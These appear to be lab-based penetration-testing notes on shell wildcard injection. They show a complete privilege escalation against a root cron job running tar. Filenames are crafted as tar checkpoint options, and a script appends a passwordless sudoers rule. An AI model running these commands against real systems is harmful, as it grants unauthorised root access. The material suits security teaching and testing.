## Wildcard Injection

Wildcard characters act as placeholders and are expanded by the shell **before** the command is executed — which makes them a useful attack surface when a privileged process uses them carelessly.

| Character     | Meaning                                              |
| ------------- | ---------------------------------------------------- |
| `*`           | Matches any number of characters                     |
| `?`           | Matches exactly one character                        |
| `[abc]`       | Matches one of the characters listed                 |
| `[a-z]`       | Matches any character in the given range             |
| `~`           | Expands to the current user's home directory         |
| `--opt=val`   | Treated as a command-line flag when passed via wildcard expansion |

---

### 🎯 Practical exploit scenario

Consider a cron job running as root every minute:

```shell
*/1 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

The `*` wildcard expands to all filenames in the directory — including ones that look like `tar` flags. We can abuse this to inject arbitrary options into the command.

```shell
# 1. Write the privilege escalation payload
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# 2. Create filenames that mimic tar flags — the shell passes them as options
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh root.sh"
```

When the cron job runs, `*` expands to include those filenames, and `tar` interprets them as `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh`, executing our script as root.
